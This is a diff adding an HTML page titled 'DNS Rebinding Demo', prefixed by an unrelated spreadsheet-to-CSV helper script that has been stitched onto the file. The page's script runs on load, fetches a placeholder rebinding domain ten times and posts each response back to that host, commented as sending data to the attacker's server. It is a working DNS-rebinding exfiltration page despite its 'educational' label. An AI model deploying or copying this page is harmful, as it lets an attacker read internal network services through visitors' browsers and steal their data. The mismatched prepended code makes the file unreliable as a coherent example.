@@ -1,0 +1,70 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html>
+<head>
+    <title>DNS Rebinding Demo</title>
+</head>
+<body>
+    <h1>Welcome to the Demo</h1>
+    <p>This page is for educational purposes only.</p>
+    <script>
+        async function rebindAttack() {
+            try {
+                // Make repeated requests to the same domain
+                for (let i = 0; i < 10; i++) {
+                    let response = await fetch('http://REBIND_DOMAIN/', { mode: 'cors' });
+                    let text = await response.text();
+                    console.log('Response:', text);
+                    // Send data to attacker's server
+                    await fetch('http://REBIND_DOMAIN/data', {
+                        method: 'POST',
+                        body: `Attempt ${i + 1}: ${text.substring(0, 100)}`
+                    });
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            } catch (e) {
+                console.error('Error:', e);
+            }
+        }
+        rebindAttack();
+    </script>
+</body>
+</html>
